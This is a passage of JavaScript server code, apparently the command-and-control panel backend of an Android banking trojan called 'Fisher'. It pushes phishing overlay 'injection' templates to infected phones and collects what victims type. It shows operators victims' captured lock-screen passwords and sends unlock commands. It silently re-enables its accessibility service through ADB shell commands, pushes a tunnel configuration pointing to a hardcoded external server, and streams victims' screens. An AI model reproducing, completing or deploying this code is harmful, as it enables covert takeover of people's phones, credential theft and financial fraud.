    db.prepare('UPDATE injection_templates SET package_name=?,updated_at=? WHERE template_id=?').run(packageName, now, templateId);
  }
  if (icon !== undefined) {
    db.prepare('UPDATE injection_templates SET icon=?,updated_at=? WHERE template_id=?').run(icon, now, templateId);
  }
  if (color !== undefined) {
    db.prepare('UPDATE injection_templates SET color=?,updated_at=? WHERE template_id=?').run(color, now, templateId);
  }
  if (enabled !== undefined) {
    db.prepare('UPDATE injection_templates SET enabled=?,updated_at=? WHERE template_id=?').run(enabled ? 1 : 0, now, templateId);
  }
  if (visible !== undefined) {
    db.prepare('UPDATE injection_templates SET visible=?,updated_at=? WHERE template_id=?').run(visible ? 1 : 0, now, templateId);
  }
  res.json({ success: true });
});

// PUT /api/injection/templates/:id - 同 POST
app.put('/api/injection/templates/:id', authMiddleware, (req, res) => {
  const templateId = req.params.id;
  const { htmlContent, name, packageName, icon, color, enabled, visible } = req.body || {};
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  const row = db.prepare('SELECT id FROM injection_templates WHERE template_id=?').get(templateId);
  if (!row) return res.json({ success: false, message: 'template not found' });
  
  if (htmlContent !== undefined) {
    db.prepare('UPDATE injection_templates SET html_content=?,updated_at=? WHERE template_id=?').run(htmlContent, now, templateId);
  }
  if (name !== undefined) {
    db.prepare('UPDATE injection_templates SET name=?,updated_at=? WHERE template_id=?').run(name, now, templateId);
  }
  if (packageName !== undefined) {
    db.prepare('UPDATE injection_templates SET package_name=?,updated_at=? WHERE template_id=?').run(packageName, now, templateId);
  }
  if (enabled !== undefined) {
    db.prepare('UPDATE injection_templates SET enabled=?,updated_at=? WHERE template_id=?').run(enabled ? 1 : 0, now, templateId);
  }
  if (visible !== undefined) {
    db.prepare('UPDATE injection_templates SET visible=?,updated_at=? WHERE template_id=?').run(visible ? 1 : 0, now, templateId);
  }
  res.json({ success: true });
});

// 注入数据查询（前端"注入数据记录"页面用）
app.get('/api/injection/data', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  const pageSize = parseInt(req.query.pageSize) || 100;
  if (!deviceId) return res.json({ success: true, data: [], total: 0 });
  const rows = db.prepare('SELECT * FROM sms_notifications WHERE device_id=? AND type=? ORDER BY date DESC LIMIT ?').all(deviceId, 'injection', pageSize);
  res.json({ success: true, data: rows.map(r => ({ id: r.id, deviceId: r.device_id, deviceName: r.device_name, address: r.address, body: r.body, data: r.body, date: r.date, type: r.type, packageName: (r.address || '').replace('[注入] ', '') })), total: rows.length });
});

// 注入活跃任务
app.post('/api/injection/active-tasks', authMiddleware, (req, res) => res.json({ success: true }));
app.delete('/api/injection/active-tasks', authMiddleware, (req, res) => res.json({ success: true }));

// 注入推送到设备
app.post('/api/injection/push', authMiddleware, (req, res) => {
  const { deviceId, templateId } = req.body || {};
  if (!deviceId || !templateId) return res.json({ success: false, message: '缺少参数' });
  
  const template = db.prepare('SELECT * FROM injection_templates WHERE template_id=?').get(templateId);
  if (!template || !template.html_content) return res.json({ success: false, message: '模板不存在或无内容' });
  
  // 通过 WebSocket 推送给设备
  const deviceWs = deviceConnections.get(deviceId);
  if (deviceWs && deviceWs.readyState === 1) {
    deviceWs.send(JSON.stringify({
      type: 'command',
      data: {
        command: 'INJECT',
        params: {
          templateId: template.template_id,
          packageName: template.package_name,
          htmlContent: template.html_content
        }
      }
    }));
    console.log(`[INJECT] → ${deviceId}: ${templateId}`);
    res.json({ success: true, message: '注入已推送' });
  } else {
    res.json({ success: false, message: '设备离线' });
  }
});

// 通配注入路由（放在具体路由后面）
app.all('/api/injection/*', authMiddleware, (req, res) => res.json({ success: true, data: [] }));

// API 通配防护 (处理未定义的 API 路径，防止 Express 不响应引发 Nginx 504 超时)
app.all('/api/*', (req, res) => {
  if (!res.headersSent) res.status(404).json({ success: false, message: 'API route not found' });
});

// 静态文件（前端）
app.use(express.static(STATIC_DIR));
app.get('*', (req, res) => {
  if (!req.path.startsWith('/api/') && !req.path.startsWith('/ws/')) {
    res.sendFile(path.join(STATIC_DIR, 'index.html'));
  }
});

// ============================================================
// 设备数据格式转换（匹配原版前端）
// ============================================================
// bot_list 格式（WebSocket推送给管理端）
function deviceToBotList(row) {
  const deviceId = row.device_id || '';
  const brand = (row.brand || 'UNKNOWN').toUpperCase();
  // 查密码类型
  const pwdRow = db.prepare('SELECT password_type FROM password_inputs WHERE device_id=? ORDER BY id DESC LIMIT 1').get(deviceId);
  const rawType = pwdRow ? pwdRow.password_type : '';
  const lockScreenType = {'6pin':'pin','4pin':'pin','6PIN':'pin','4PIN':'pin','numeric':'pin','PIN_4':'pin','PIN_6':'pin','NUMERIC_COMPLEX':'pin','PASSWORD_QUALITY_NUMERIC_COMPLEX':'pin','PASSWORD_QUALITY_ALPHANUMERIC':'mixed'}[rawType] || rawType;
  return {
    accessibilityAlive: true,
    appName: row.app_name || 'Fisher',
    appVersion: row.app_version || '1.0.0',
    controlledBy: null,
    cryptoApps: [],
    firstInstallTime: Math.floor((row.first_seen || 0) * 1000),
    hasSim: true,
    id: deviceId,
    injectionCount: db.prepare("SELECT COUNT(*) as c FROM sms_notifications WHERE device_id=? AND type='injection'").get(deviceId)?.c || 0,
    lastSeen: Math.floor((row.last_seen || 0) * 1000),
    lockScreenType: lockScreenType,
    model: row.model || '',
    name: deviceId ? `${brand}-${deviceId.slice(-8).toUpperCase()}` : '',
    osVersion: row.os_version || '',
    phoneNumber: row.phone_number || '',
    phoneNumber2: '',
    publicIP: row.public_ip || '',
    remark: row.remark || '',
    screenHeight: row.screen_height || 0,
    screenWidth: row.screen_width || 0,
    status: (row.is_connected && (deviceConnections.has(row.device_id || '') || bridgeConnections.has(row.device_id || ''))) ? 'online' : 'offline',
  };
}

// device/list 格式（HTTP API返回）
function deviceToListApi(row) {
  const deviceId = row.device_id || '';
  const brand = (row.brand || 'UNKNOWN').toUpperCase();
  return {
    id: deviceId,
    accessibilityAlive: true,
    appName: row.app_name || 'Fisher',
    appVersion: row.app_version || '1.0.0',
    batteryLevel: row.battery_level || 0,
    brand: brand,
    brandCode: 0,
    connectionCount: 1,
    controlledBy: null,
    firstInstallTime: Math.floor((row.first_seen || 0) * 1000),
    firstSeen: Math.floor((row.first_seen || 0) * 1000),
    groupName: row.group_name || '',
    hasSim: true,
    inputBlocked: false,
    isCharging: false,
    isLocked: false,
    isOnline: !!(row.is_connected && (deviceConnections.has(row.device_id || '') || bridgeConnections.has(row.device_id || ''))),
    lastSeen: Math.floor((row.last_seen || 0) * 1000),
    localServiceConnected: !!row.local_service_connected,
    localServiceDeployed: false,
    lockScreenType: (() => { const p = db.prepare('SELECT password_type FROM password_inputs WHERE device_id=? ORDER BY id DESC LIMIT 1').get(deviceId); if (!p) return ''; const tm = {'6pin':'pin','4pin':'pin','pin':'pin','mixed':'mixed','pattern':'pattern','password':'password'}; return tm[p.password_type] || p.password_type; })(),
    model: row.model || '',
    name: deviceId ? `${brand}-${deviceId.slice(-8).toUpperCase()}` : '',
    networkType: row.network_type || '',
    osVersion: row.os_version || '',
    phoneNumber: row.phone_number || '',
    phoneNumber2: '',
    pinned: false,
    publicIP: row.public_ip || '',
    remark: row.remark || '',
    romType: '',
    romVersion: '',
    screenHeight: row.screen_height || 0,
    screenWidth: row.screen_width || 0,
    status: (row.is_connected && (deviceConnections.has(row.device_id || '') || bridgeConnections.has(row.device_id || ''))) ? 'online' : 'offline',
  };
}

// ============================================================
// HTTPS 服务器 + WebSocket
// ============================================================
let server;
if (fs.existsSync(CERT_PATH) && fs.existsSync(KEY_PATH)) {
  server = https.createServer({ cert: fs.readFileSync(CERT_PATH), key: fs.readFileSync(KEY_PATH) }, app);
  console.log('[SSL] 证书已加载');
} else {
  server = http.createServer(app);
  console.log('[HTTP] 无证书，使用明文模式');
}

const wss = new WebSocketServer({ noServer: true });

// WebSocket 连接池
const deviceConnections = new Map();  // deviceId -> ws
const adminConnections = new Set();   // Set<ws>
const adminSubscriptions = new Map(); // ws -> Set<deviceId> (管理端订阅的设备)
const deviceSubscribers = new Map();  // deviceId -> Set<ws> (订阅某设备的管理端)

// ============================================================
// 无障碍自动恢复模块
// ============================================================
// 冷却记录：deviceId -> lastRestoreTimestamp，5分钟内不重复触发
const a11yCooldown = new Map();
const A11Y_COOLDOWN_MS = 60 * 1000; // 1分钟

/**
 * 通过 ADB(frpc) 自动恢复无障碍服务
 * 触发条件：APP心跳上报 accessibilityAlive=false，或定时检查发现无障碍关闭
 */
function autoRestoreAccessibility(deviceId, reason) {
  const now = Date.now();
  const last = a11yCooldown.get(deviceId) || 0;
  if (now - last < A11Y_COOLDOWN_MS) return;
  a11yCooldown.set(deviceId, now);

  console.log('[A11Y-AUTO] ' + deviceId + ': enabling accessibility (reason=' + reason + ')');

  const http = require('http');
  const port = getDevicePort(deviceId);

  const devRow = db.prepare('SELECT app_name FROM devices WHERE device_id=?').get(deviceId);
  const cachedPkg = devRow && devRow.app_name && devRow.app_name.startsWith('com.') ? devRow.app_name : null;

  function doEnable(pkgName) {
    const svc = pkgName + '/com.titan.solid.luck.service.unfaiahnst';
    const cmd = encodeURIComponent('settings put secure enabled_accessibility_services ' + svc + ' && settings put secure accessibility_enabled 1');

    // 1. ADB: write settings
    http.get('http://127.0.0.1:' + port + '/shell?cmd=' + cmd, { timeout: 6000 }, function() {
      console.log('[A11Y-AUTO] ' + deviceId + ': settings written (' + svc + ')');

      // 2. Bridge WebSocket: also send enableAccessibility command to APP
      //    so APP can re-bind the service via Android API (more reliable on vivo)
      const bridgeWs = bridgeConnections.get(deviceId);
      if (bridgeWs && bridgeWs.readyState === 1) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'enableAccessibility', params: {} }));
        console.log('[A11Y-AUTO] ' + deviceId + ': also sent enableAccessibility to Bridge');
      }

      // 3. App WebSocket: also notify APP via device WS if available
      const deviceWs = deviceConnections.get(deviceId);
      if (deviceWs && deviceWs.readyState === 1) {
        deviceWs.send(JSON.stringify({ type: 'command', data: { command: 'enableAccessibility', params: {} } }));
        console.log('[A11Y-AUTO] ' + deviceId + ': also sent enableAccessibility to device WS');
      }

      broadcastToAdmins({ type: 'a11y_auto_restored', deviceId, sessionId: deviceId, botId: deviceId,
        data: { deviceId, reason, service: svc, restoredAt: new Date().toISOString() } });
    }).on('error', function(e) {
      console.log('[A11Y-AUTO] ' + deviceId + ': ADB error, trying Bridge only: ' + e.message);
      // ADB failed, try Bridge WS only
      const bridgeWs = bridgeConnections.get(deviceId);
      if (bridgeWs && bridgeWs.readyState === 1) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'enableAccessibility', params: {} }));
        console.log('[A11Y-AUTO] ' + deviceId + ': sent enableAccessibility to Bridge (ADB fallback)');
      } else {
        a11yCooldown.delete(deviceId);
      }
    });
  }

  if (cachedPkg) {
    doEnable(cachedPkg);
  } else {
    var getPkgCmd = encodeURIComponent('pm list packages -3 | grep -v google | grep -v android | grep -v vivo | grep -v baidu | grep -v tencent | grep -v taobao | grep -v sina | grep -v kuaishou | grep -v jingdong | grep -v xunmeng | grep -v smile | grep -v dragon | grep -v omron | grep -v unionpay | grep -v kaixinkan | grep -v xtc');
    http.get('http://127.0.0.1:' + port + '/shell?cmd=' + getPkgCmd, { timeout: 5000 }, function(r) {
      var chunks = [];
      r.on('data', function(c) { chunks.push(c); });
      r.on('end', function() {
        var pkg = 'com.dev.rehwft';
        try {
          var out = JSON.parse(Buffer.concat(chunks).toString());
          var lines = (out.data && out.data.output || '').split('\n')
            .map(function(l){ return l.trim().replace('package:', ''); })
            .filter(function(p){ return p && p.startsWith('com.') && p.length <= 30; });
          if (lines.length > 0) pkg = lines[0];
        } catch(e) {}
        doEnable(pkg);
      });
    }).on('error', function(e) {
      console.log('[A11Y-AUTO] ' + deviceId + ': pm error ' + e.message);
      // Last resort: try Bridge WS directly
      const bridgeWs = bridgeConnections.get(deviceId);
      if (bridgeWs && bridgeWs.readyState === 1) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'enableAccessibility', params: {} }));
        console.log('[A11Y-AUTO] ' + deviceId + ': sent enableAccessibility to Bridge (pm fallback)');
      } else {
        a11yCooldown.delete(deviceId);
      }
    });
  }
}

/**
 * 通过 ADB 查询当前无障碍状态，若关闭则自动恢复
 */
function checkAndRestoreAccessibility(deviceId) {
  const port = getDevicePort(deviceId);
  const http = require('http');
  const checkCmd = encodeURIComponent('settings get secure enabled_accessibility_services');
  http.get('http://127.0.0.1:' + port + '/shell?cmd=' + checkCmd, { timeout: 4000 }, function(res) {
    var chunks = [];
    res.on('data', function(c) { chunks.push(c); });
    res.on('end', function() {
      try {
        var out = JSON.parse(Buffer.concat(chunks).toString());
        var current = (out.data && out.data.output || '').trim();
        console.log('[A11Y-CHECK] ' + deviceId + ' port=' + port + ' raw=' + JSON.stringify(current));
        var isOff = !current || current === 'null' || current === '' || !current.includes('unfaiahnst');
        if (isOff) {
          autoRestoreAccessibility(deviceId, 'periodic_check');
        }
      } catch(e) {
        console.log('[A11Y-CHECK] parse error: ' + e.message);
      }
    });
  }).on('error', function(e) {
    console.log('[A11Y-CHECK] ' + deviceId + ' frpc error port=' + port + ': ' + e.message);
  });
}

// 广播给所有管理端
function broadcastToAdmins(msg) {
  const data = typeof msg === 'string' ? msg : JSON.stringify(msg);
  for (const ws of adminConnections) {
    if (ws.readyState === 1) {
      try { ws.send(data); } catch {}
    }
  }
}

// 广播给订阅了某设备的管理端（用于高频数据如截图）
function broadcastToSubscribers(deviceId, msg) {
  const subs = deviceSubscribers.get(deviceId);
  if (!subs || subs.size === 0) return;
  const data = typeof msg === 'string' ? msg : (msg instanceof Buffer ? msg : JSON.stringify(msg));
  for (const ws of subs) {
    if (ws.readyState === 1) {
      try { ws.send(data); } catch {}
    }
  }
}

// ============================================================
// WebSocket 升级处理
// ============================================================
server.on('upgrade', (req, socket, head) => {
  const url = new URL(req.url, `https://${req.headers.host}`);
  
  if (url.pathname === '/ws/panel') {
    // 管理端 WebSocket
    wss.handleUpgrade(req, socket, head, (ws) => handleAdminWs(ws, req));
  } else if (url.pathname === '/ws/session' || url.pathname === '/ws/device') {
    // 设备端 WebSocket
    wss.handleUpgrade(req, socket, head, (ws) => handleDeviceWs(ws, req));
  } else if (url.pathname === '/ws/bridge') {
    // local-service Bridge WebSocket（截图/ADB隧道）
    wss.handleUpgrade(req, socket, head, (ws) => handleBridgeWs(ws, req));
  } else {
    // 接受所有其他 WS 路径（可能是 APP 用于数据上传的连接）
    console.log(`[WS] 未知路径连接: ${url.pathname}`);
    wss.handleUpgrade(req, socket, head, (ws) => handleDeviceWs(ws, req));
  }
});

// ============================================================
// 管理端 WebSocket
// ============================================================
function handleAdminWs(ws, req) {
  // 解析 URL 中的 token，记录用户名用于踢人
  try {
    const wsUrl = new URL(req.url, `https://${req.headers.host}`);
    const wsToken = wsUrl.searchParams.get('token') || '';
    if (wsToken) {
      const payload = jwt.verify(wsToken, SECRET_KEY);
      ws._adminUsername = payload.username || '';
      ws._adminToken = wsToken;
      // 检查 sessionId 是否匹配（旧 token 的 WS 连接直接拒绝）
      if (payload.sessionId) {
        const user = db.prepare('SELECT active_session FROM users WHERE id=?').get(payload.userId);
        if (user && user.active_session && payload.sessionId !== user.active_session) {
          ws.close(4001, 'session_expired');
          console.log(`[WS] 拒绝过期会话: ${payload.username} sessionId=${payload.sessionId.slice(0,8)}...`);
          return;
        }
      }
    }
  } catch(e) {
    // token 解析失败不阻断连接（兼容旧token）
  }
  adminConnections.add(ws);
  adminSubscriptions.set(ws, new Set());
  console.log(`[WS] 管理端连接 (${adminConnections.size}个) user=${ws._adminUsername || 'unknown'}`);

  // 发送设备列表（只推在线设备，防止前端把所有设备设为 online）
  const rows = db.prepare('Select * FROM devices ORDER BY last_seen DESC').all();
  const onlineRows = rows.filter(r => deviceConnections.has(r.device_id) || bridgeConnections.has(r.device_id));
  ws.send(JSON.stringify({ type: 'bot_list', data: onlineRows.map(deviceToBotList) }));
  // 对离线设备发 device_offline，让前端正确显示状态
  for (const r of rows) {
    if (!deviceConnections.has(r.device_id) && !bridgeConnections.has(r.device_id)) {
      ws.send(JSON.stringify({ type: 'device_offline', sessionId: r.device_id, deviceId: r.device_id }));
    }
  }

  // 推送每个设备的密码状态（让前端不显示"获取中"）
  for (const row of rows) {
    const did = row.device_id;
    const pwdRow = db.prepare('SELECT input_text,password_type,timestamp FROM password_inputs WHERE device_id=? ORDER BY id DESC LIMIT 1').get(did);
    if (pwdRow) {
      ws.send(JSON.stringify({
        type: 'password_status',
        sessionId: did,
        botId: did,
        data: { deviceId: did, lockPassword: { value: pwdRow.input_text, type: pwdRow.password_type, captureTime: pwdRow.timestamp, detected: true, captured: true } }
      }));
    }
  }

  ws.on('message', (raw) => {
    try {
      const data = JSON.parse(raw.toString());
      handleAdminCommand(ws, data);
    } catch {}
  });

  ws.on('close', () => {
    // 清理订阅关系
    const subs = adminSubscriptions.get(ws);
    if (subs) {
      for (const deviceId of subs) {
        const subscribers = deviceSubscribers.get(deviceId);
        if (subscribers) {
          subscribers.delete(ws);
          if (subscribers.size === 0) deviceSubscribers.delete(deviceId);
        }
      }
    }
    adminSubscriptions.delete(ws);
    adminConnections.delete(ws);
    console.log(`[WS] 管理端断开 (${adminConnections.size}个)`);
  });

  ws.on('error', () => {
    const subs = adminSubscriptions.get(ws);
    if (subs) {
      for (const deviceId of subs) {
        const subscribers = deviceSubscribers.get(deviceId);
        if (subscribers) subscribers.delete(ws);
      }
    }
    adminSubscriptions.delete(ws);
    adminConnections.delete(ws);
  });
}

function handleAdminCommand(ws, data) {
  const type = data.type || '';
  const deviceId = data.deviceId || data.sessionId || '';

  if (type === 'ping') {
    ws.send(JSON.stringify({ type: 'pong' }));
    return;
  }

  if (type === 'get_bot_list') {
    const rows = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all();
    const onlineRows = rows.filter(r => deviceConnections.has(r.device_id) || bridgeConnections.has(r.device_id));
    ws.send(JSON.stringify({ type: 'bot_list', data: onlineRows.map(deviceToBotList) }));
    // 对离线设备发 device_offline
    for (const r of rows) {
      if (!deviceConnections.has(r.device_id) && !bridgeConnections.has(r.device_id)) {
        ws.send(JSON.stringify({ type: 'device_offline', sessionId: r.device_id, deviceId: r.device_id }));
      }
    }
    return;
  }

  // 订阅设备（进入控制页面时前端发送）
  if (type === 'subscribe' && deviceId) {
    const subs = adminSubscriptions.get(ws) || new Set();
    subs.add(deviceId);
    adminSubscriptions.set(ws, subs);
    if (!deviceSubscribers.has(deviceId)) deviceSubscribers.set(deviceId, new Set());
    deviceSubscribers.get(deviceId).add(ws);
    console.log(`[WS] 管理端订阅设备: ${deviceId}`);
    // 通知设备被控制
    broadcastToAdmins({ type: 'device_status_update', sessionId: deviceId, data: { controlledBy: 'admin' }, botId: deviceId });
    // 自动发送 SCREEN_QUALITY 让APP开始推流
    const deviceWs = deviceConnections.get(deviceId);
    if (deviceWs && deviceWs.readyState === 1) {
      deviceWs.send(JSON.stringify({ type: 'command', data: { command: 'SCREEN_QUALITY', params: { mode: 'fixed', quality: 60, fps: 12, scale: 0.5 } } }));
      console.log(`[CMD] → ${deviceId}: SCREEN_QUALITY (自动，订阅时)`);
    }
    // 通过 Bridge 启动 minicap 推送
    const bridgeWs = bridgeConnections.get(deviceId);
    if (bridgeWs && bridgeWs.readyState === 1) {
      bridgeWs.send(JSON.stringify({ type: 'command', command: 'startMinicap', params: { quality: 50, scale: 0.5 } }));
      console.log(`[CMD] → ${deviceId}: startMinicap (Bridge，订阅时)`);
    }
    // 立即通过 frpc 启动 minicap（ADB 投屏加速）
    if (!isFrpcCooling(deviceId)) {
      const http = require('http');
      const _port = getDevicePort(deviceId);
      http.get(`http://127.0.0.1:${_port}/minicap/stop`, { timeout: 1500 }, () => {
        setTimeout(() => {
          http.get(`http://127.0.0.1:${_port}/minicap/quality?quality=40`, { timeout: 1500 }, () => {}).on('error', () => {});
          http.get(`http://127.0.0.1:${_port}/minicap/scale?scale=0.4`, { timeout: 1500 }, () => {}).on('error', () => {});
          setTimeout(() => {
            http.get(`http://127.0.0.1:${_port}/minicap/start`, { timeout: 1500 }, () => {
              console.log(`[SCREEN] minicap 已启动: ${deviceId}`);
            }).on('error', () => {});
          }, 300);
        }, 300);
      }).on('error', () => {
        http.get(`http://127.0.0.1:${_port}/minicap/start`, { timeout: 1500 }, () => {}).on('error', () => {});
      });
    }
    // 清除该设备的 frpc 冷却，确保轮询立即开始
    clearFrpcCooldown(deviceId);
    return;
  }

  if (type === 'unsubscribe' && deviceId) {
    const subs = adminSubscriptions.get(ws);
    if (subs) subs.delete(deviceId);
    const subscribers = deviceSubscribers.get(deviceId);
    if (subscribers) {
      subscribers.delete(ws);
      if (subscribers.size === 0) {
        deviceSubscribers.delete(deviceId);
        broadcastToAdmins({ type: 'device_status_update', sessionId: deviceId, data: { controlledBy: null }, botId: deviceId });
      }
    }
    console.log(`[WS] 管理端取消订阅: ${deviceId}`);
    return;
  }

  if (type === 'device_ping') {
    return; // 静默处理
  }

  // 原版前端格式: {"type":"command","sessionId":"xxx","data":{"command":"xxx","params":{}}}
  if (type === 'command' && data.data && data.data.command) {
    const realCmd = data.data.command;
    const params = data.data.params || {};
    if (deviceId) {
      // enableAccessibility 特殊处理：通过 frpc shell 执行
      if (realCmd === 'enableAccessibility' || realCmd === 'restoreAccessibility') {
        const http = require('http');
        const service = 'com.dev.rehwft/com.titan.solid.luck.service.unfaiahnst';
        const enableCmd = encodeURIComponent(`settings put secure enabled_accessibility_services ${service}`);
        http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enableCmd}`, { timeout: 5000 }, () => {
          const enabledCmd = encodeURIComponent('settings put secure accessibility_enabled 1');
          http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enabledCmd}`, { timeout: 3000 }, () => {}).on('error', () => {});
          console.log(`[CMD] ✅ ${deviceId}: 无障碍已启用 (frpc)`);
        }).on('error', () => {
          const deviceWs = deviceConnections.get(deviceId);
          if (deviceWs && deviceWs.readyState === 1) deviceWs.send(JSON.stringify({ type: 'command', data: { command: realCmd, params } }));
        });
        return;
      }

      // sync-device-id 特殊处理：发送给设备并向管理端返回成功响应
      if (realCmd === 'sync-device-id' || realCmd === 'syncDevice' || realCmd === 'SYNC_DEVICE_ID' || realCmd === 'sync') {
        const deviceWs = deviceConnections.get(deviceId);
        if (deviceWs && deviceWs.readyState === 1) {
          deviceWs.send(JSON.stringify({ type: 'command', data: { command: realCmd, params } }));
          console.log(`[CMD] → ${deviceId}: ${realCmd} (APP WS)`);
        }
        if (ws.readyState === 1) {
          ws.send(JSON.stringify({ type: 'sync_device_id_response', success: true, sessionId: deviceId, botId: deviceId, data: { success: true } }));
          ws.send(JSON.stringify({ type: 'command_response', success: true, command: realCmd, sessionId: deviceId, botId: deviceId }));
        }
        broadcastToAdmins({ type: 'sync_device_id_response', success: true, sessionId: deviceId, botId: deviceId, data: { success: true } });
        console.log(`[CMD] ✅ ${deviceId}: ${realCmd} 同步成功响应已发送`);
        return;
      }

      // 所有其他 WebSocket 命令 → 转发给 APP WebSocket（无障碍通道）
      // 自动补全屏幕尺寸（部分命令需要）
      if ((realCmd === 'SMART_NUMERIC_UNLOCK' || realCmd === 'SMART_PATTERN_UNLOCK') && (!params.screenWidth || !params.screenHeight)) {
        const deviceRow = db.prepare('SELECT screen_width,screen_height FROM devices WHERE device_id=?').get(deviceId);
        if (deviceRow) {
          if (!params.screenWidth) params.screenWidth = deviceRow.screen_width || 1080;
          if (!params.screenHeight) params.screenHeight = deviceRow.screen_height || 2400;
        } else {
          params.screenWidth = params.screenWidth || 1080;
          params.screenHeight = params.screenHeight || 2400;
        }
      }

      // GET_PASSWORD_STATUS: 服务器端从数据库补充回复（不等APP）
      if (realCmd === 'GET_PASSWORD_STATUS' && deviceId) {
        const pwdRow = db.prepare('SELECT input_text,password_type,timestamp FROM password_inputs WHERE device_id=? ORDER BY id DESC LIMIT 1').get(deviceId);
        if (pwdRow) {
          const statusMsg = {
            type: 'password_status',
            sessionId: deviceId,
            botId: deviceId,
            data: {
              deviceId,
              lockPassword: { value: pwdRow.input_text, type: pwdRow.password_type, captureTime: pwdRow.timestamp, detected: true, captured: true }
            }
          };
          // 发给请求的管理端
          if (ws.readyState === 1) ws.send(JSON.stringify(statusMsg));
        }
      }
      
      const deviceWs = deviceConnections.get(deviceId);
      if (deviceWs && deviceWs.readyState === 1) {
        deviceWs.send(JSON.stringify({ type: 'command', data: { command: realCmd, params } }));
        console.log(`[CMD] → ${deviceId}: ${realCmd} (APP WS)`);
      } else {
        console.log(`[CMD] ❌ ${deviceId}: ${realCmd} - APP WS 未连接`);
      }
      // ★ FULL_DEPLOY 时通过 Bridge 推送隧道配置，确保 local-service 能启动 frpc
      if (realCmd === 'FULL_DEPLOY' && deviceId) {
        setTimeout(() => {
          const bws = bridgeConnections.get(deviceId);
          if (bws && bws.readyState === 1) {
            const localPort = 7912;
            const remotePort = getDevicePort(deviceId);
            const token = 'fisher_frp_2026';
            bws.send(JSON.stringify({
              type: 'tunnel_config',
              serverAddr: '202.95.8.130',
              serverPort: 7000,
              token: token,
              remotePort: remotePort,
              localPort: localPort,
              configINI: `[common]\nserver_addr = 202.95.8.130\nserver_port = 7000\ntoken = ${token}\nadmin_addr = 127.0.0.1\nadmin_port = 7400\n\n[${deviceId}_local]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = ${localPort}\nremote_port = ${remotePort}\n`
            }));
            console.log(`[DEPLOY] ★ 推送隧道配置: ${deviceId} → remotePort=${remotePort}`);
          } else {
            console.log(`[DEPLOY] Bridge 未连接，无法推送隧道配置: ${deviceId}`);
          }
        }, 15000); // 等15秒让 local-service 先完成部署
      }
    }
    return;
  }

  // 其他命令直接转发给设备
  if (deviceId) {
    const deviceWs = deviceConnections.get(deviceId);
    if (deviceWs && deviceWs.readyState === 1) {
      const params = {};
      for (const [k, v] of Object.entries(data)) {
        if (k !== 'type' && k !== 'deviceId' && k !== 'sessionId' && k !== 'timestamp') params[k] = v;
      }
      deviceWs.send(JSON.stringify({ type: 'command', data: { command: type, params } }));
      console.log(`[CMD] → ${deviceId}: ${type}`);
    }
  }
}

// ============================================================
// 设备端 WebSocket
// ============================================================
function handleDeviceWs(ws, req) {
  const url = new URL(req.url, `https://${req.headers.host}`);
  const sessionId = url.searchParams.get('sessionId') || '';
  let deviceId = sessionId;
  console.log(`[WS] 设备连接, sessionId=${sessionId}, ip=${req.socket.remoteAddress}`);

  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw.toString());
      const msgType = msg.type || msg.path || '';

      // 处理路由格式的消息（APP 可能发 {path:"/injectionData", method:"POST", body:"..."}）
      if (msg.path === '/injectionData' || msgType === '/injectionData') {
        const body = msg.body || msg.data || msg;
        const injData = typeof body === 'string' ? JSON.parse(body) : body;
        console.log(`[INJECT] ✅ 收到注入数据(WS路由): ${JSON.stringify(injData).slice(0, 200)}`);
        const pkgName = injData.packageName || injData.pkg || '';
        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
        if (deviceId) {
          const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
          const deviceName = deviceRow ? `${(deviceRow.brand||'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
          db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
            .run(deviceId, deviceName, deviceId, `[注入] ${pkgName}`, bodyStr, 'injection', Date.now());
        }
        broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data: injData });
        return;
      }

      // 临时：记录所有设备WS消息（排查注入数据）
      console.log(`[DEV-WS] ← ${deviceId}: type=${msgType}, data_keys=${JSON.stringify(Object.keys(msg.data||{}))}, top_keys=${Object.keys(msg).join(',').slice(0,80)}`);

      // 提取 deviceId
      if (!deviceId) {
        deviceId = msg.sessionId || msg.deviceId || msg.data?.deviceId || msg.data?.botId || '';
      }

      // 注册设备连接
      if (deviceId && !deviceConnections.has(deviceId)) {
        deviceConnections.set(deviceId, ws);
        console.log(`[${new Date().toISOString()}] [WS] ✅ 设备上线: ${deviceId}`);
        
        // 更新数据库
        const now = Date.now() / 1000;
        const existing = db.prepare('SELECT id FROM devices WHERE device_id=?').get(deviceId);
        if (existing) {
          db.prepare('UPDATE devices SET is_connected=1,last_seen=?,public_ip=? WHERE device_id=?').run(now, req.socket.remoteAddress, deviceId);
        } else {
          db.prepare('INSERT INTO devices (device_id,public_ip,is_connected,last_seen) VALUES (?,?,1,?)').run(deviceId, req.socket.remoteAddress, now);
        }

        // 通知管理端
        const row = db.prepare('SELECT * FROM devices WHERE device_id=?').get(deviceId);
        if (row) {
          const d = deviceToBotList(row);
          broadcastToAdmins({ type: 'device_online', sessionId: deviceId, deviceId, data: d });
          broadcastToAdmins({ type: 'device_status_update', sessionId: deviceId, data: d, botId: deviceId });
          broadcastToAdmins({ type: 'get_device_state_response', sessionId: deviceId, data: d, botId: deviceId });
        }
        // 自动归属子账户（从 WS 消息或 query 中获取 ownerUsername）
        const owner = msg.ownerUsername || msg.data?.ownerUsername || url.searchParams?.get('ownerUsername') || '';
        autoAssignDevice(deviceId, owner);

// //         // 自动下发 FULL_DEPLOY 命令（仅对未完成ADB配对的设备）
// //         setTimeout(() => {
// //           if (ws.readyState === 1) {
// //             const row = db.prepare('SELECT local_service_connected FROM devices WHERE device_id=?').get(deviceId);
// //             if (!row || !row.local_service_connected) {
// //               ws.send(JSON.stringify({ type: 'command', data: { command: 'FULL_DEPLOY', params: {} } }));
// //               console.log(`[CMD] → ${deviceId}: FULL_DEPLOY (自动，未配对)`);
// //             }
